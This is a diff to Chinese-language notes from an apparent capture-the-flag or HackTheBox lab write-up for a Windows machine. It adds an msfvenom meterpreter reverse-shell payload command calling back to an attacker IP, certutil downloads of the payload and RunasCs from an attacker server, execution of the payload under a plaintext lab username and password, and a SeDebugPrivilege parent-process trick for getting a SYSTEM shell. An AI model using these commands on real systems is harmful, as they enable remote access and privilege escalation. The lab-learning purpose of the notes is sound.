@@ -909,6 +909,12 @@ runas的进阶,可以通过显示凭据登录
 制作一个反弹shell的木马和Runascs.exe上传过去
 ` msfvenom -p windows/x64/shell_reverse_tcp LHOST=Your_IP LPORT=5959 -f exe -o pov.exe`
 
+!!尝试多次成功的payload
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.10.16.56 lport=5959 -f exe -a x64 --platform windows -o pov.exe
+```
+
+
 ```bash
 certutil -urlcache -f http://10.10.16.26:8000/RunasCs.exe RunasCs.exe
 certutil -urlcache -f http://10.10.16.26:8000/pov.exe pov.exe
@@ -919,7 +925,20 @@ certutil -urlcache -f http://10.10.16.26:8000/pov.exe pov.exe
 `.\RunasCs.exe alaading f8gQ8fynP44ek1m3 "pov.exe"`
 .\rc.exe alaading f8gQ8fynP44ek1m3 "pov.exe"
 
-卡在sending stage了....,应该是因为vpn在window上
+msf卡在sending stage了....
+
+---
+`whoami /priv`
+开了debug
+![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240424011203.png)
+
+`import-module .\psgetsys.ps1; [MyProcess]::CreateProcessFromParent(552,"C:\windows\system32\cmd.exe")`
+`[MyProcess]::CreateProcessFromParent(656,"c:\windows\system32\cmd.exe","")`
+
+
+---
+
+
 
 ### Manager
 #### user
